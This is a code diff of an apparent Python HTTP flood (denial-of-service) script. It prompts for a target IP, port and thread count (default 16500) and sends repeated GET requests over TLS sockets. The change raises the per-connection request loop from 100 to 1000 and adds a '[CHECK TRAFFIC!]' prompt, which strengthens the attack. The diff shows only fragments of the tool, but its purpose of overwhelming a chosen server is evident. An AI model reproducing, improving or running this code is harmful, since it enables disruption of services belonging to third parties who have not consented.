@@ -3,11 +3,13 @@ import socket
 import sys
 import ssl
 import socket
+import os
 import urllib.request
 import urllib.error
 import random
 import time
 
+os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
 logo="""
 < =============== >
@@ -34,6 +36,8 @@ ip = input("[+] Enter the target IP address: ")
 port = input("[+] Enter the target port (default: 80): ")
 numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
 method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
+print("[CHECK TRAFFIC!]")
+time.sleep(0.5)
 
 if port == "":
     port = str(80)
@@ -149,7 +153,7 @@ def LaunchSTELLAR(url, timer):
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for _ in range(100):
+                for _ in range(1000):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
